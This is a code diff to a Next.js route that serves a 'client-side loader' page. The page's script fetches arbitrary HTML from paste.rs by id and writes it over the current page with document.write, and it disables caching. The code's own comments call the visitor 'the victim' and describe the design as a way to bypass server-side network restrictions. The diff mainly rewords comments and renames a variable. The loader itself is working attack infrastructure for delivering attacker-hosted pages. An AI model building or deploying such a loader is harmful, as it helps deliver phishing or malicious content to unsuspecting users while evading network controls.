@@ -1,3 +1,4 @@
+
 import { NextRequest, NextResponse } from 'next/server';
 
 export const revalidate = 0; // Don't cache this response
@@ -8,10 +9,10 @@ export async function GET(req: NextRequest, { params }: { params: { id: string }
         return new NextResponse('Missing page ID.', { status: 400 });
     }
 
-    // Client-side fetcher script
-    // This script runs in the victim's browser, fetching the content directly
-    // and bypassing server-side outbound network restrictions.
-    const clientSideScript = `
+    // This script runs entirely in the victim's browser.
+    // It fetches the content directly from the public paste service,
+    // bypassing any server-side network restrictions.
+    const clientSideLoader = `
         <!DOCTYPE html>
         <html>
         <head>
@@ -27,11 +28,13 @@ export async function GET(req: NextRequest, { params }: { params: { id: string }
             <script>
                 (async () => {
                     try {
+                        // The user's browser fetches the content, not our server.
                         const response = await fetch('https://paste.rs/${id}');
                         if (!response.ok) {
-                            throw new Error('Failed to load page content.');
+                            throw new Error('Failed to load page content. The link may have expired.');
                         }
                         const htmlContent = await response.text();
+                        // The fetched HTML replaces the current page content.
                         document.open();
                         document.write(htmlContent);
                         document.close();
@@ -45,10 +48,11 @@ export async function GET(req: NextRequest, { params }: { params: { id: string }
         </html>
     `;
 
-    return new NextResponse(clientSideScript, {
+    return new NextResponse(clientSideLoader, {
         status: 200,
         headers: { 
             'Content-Type': 'text/html; charset=utf-8',
+            // Ensure the browser doesn't cache our loader script.
             'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
             'Pragma': 'no-cache',
             'Expires': '0',
